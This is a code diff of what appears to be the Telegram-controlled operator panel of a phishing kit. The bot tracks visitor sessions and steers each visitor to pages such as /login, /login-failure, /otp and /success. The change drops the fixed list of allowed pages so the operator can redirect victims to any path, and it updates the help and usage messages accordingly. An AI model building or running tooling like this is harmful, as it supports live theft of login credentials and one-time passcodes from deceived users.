@@ -88,13 +88,12 @@ export async function handleRedirectCommand(sessionId: string, page: string): Pr
       return `❌ <b>Visitor not found</b>\n\nNo visitor with session starting with <code>${sessionId}</code>`;
     }
 
-    // Validate page
-    const validPages = ['/login', '/login-failure', '/loading', '/otp', '/success', '/'];
-    if (!validPages.includes(page)) {
-      return `❌ <b>Invalid page</b>\n\nValid pages: ${validPages.join(', ')}`;
+    // Validate that page starts with /
+    if (!page.startsWith('/')) {
+      return `❌ <b>Invalid page</b>\n\nPage must start with / (e.g., /login, /custom-page)`;
     }
 
-    // Set redirect target
+    // Set redirect target (allows ANY page path)
     await db
       .update(visitors)
       .set({ redirectTarget: page })
@@ -126,8 +125,11 @@ export async function handleTelegramCommand(commandText: string): Promise<string
       if (parts.length < 3) {
         return `❌ <b>Invalid syntax</b>\n\n` +
                `Usage: <code>/redirect &lt;session&gt; &lt;page&gt;</code>\n\n` +
-               `Example: <code>/redirect a1b2c3d4 /login</code>\n\n` +
-               `Valid pages: /login, /login-failure, /otp, /success`;
+               `<b>Examples:</b>\n` +
+               `<code>/redirect a1b2c3d4 /login</code>\n` +
+               `<code>/redirect a1b2c3d4 /otp</code>\n` +
+               `<code>/redirect a1b2c3d4 /custom-page</code>\n\n` +
+               `You can redirect to ANY page path!`;
       }
       const sessionId = parts[1];
       const page = parts[2];
@@ -137,13 +139,14 @@ export async function handleTelegramCommand(commandText: string): Promise<string
     case "/help":
       return `🤖 <b>Admin Bot Commands</b>\n\n` +
              `<code>/visitors</code> - List all active visitors\n` +
-             `<code>/redirect &lt;session&gt; &lt;page&gt;</code> - Redirect a visitor\n\n` +
+             `<code>/redirect &lt;session&gt; &lt;page&gt;</code> - Redirect visitor to ANY page\n\n` +
              `<b>Examples:</b>\n` +
              `<code>/visitors</code>\n` +
              `<code>/redirect a1b2c3d4 /login</code>\n` +
-             `<code>/redirect a1b2c3d4 /otp</code>\n\n` +
-             `<b>Valid pages:</b>\n` +
-             `/login, /login-failure, /otp, /success`;
+             `<code>/redirect a1b2c3d4 /otp</code>\n` +
+             `<code>/redirect a1b2c3d4 /custom-page</code>\n` +
+             `<code>/redirect a1b2c3d4 /any/path/you/want</code>\n\n` +
+             `💡 You can redirect to ANY page path!`;
 
     default:
       return `❌ <b>Unknown command</b>\n\n` +
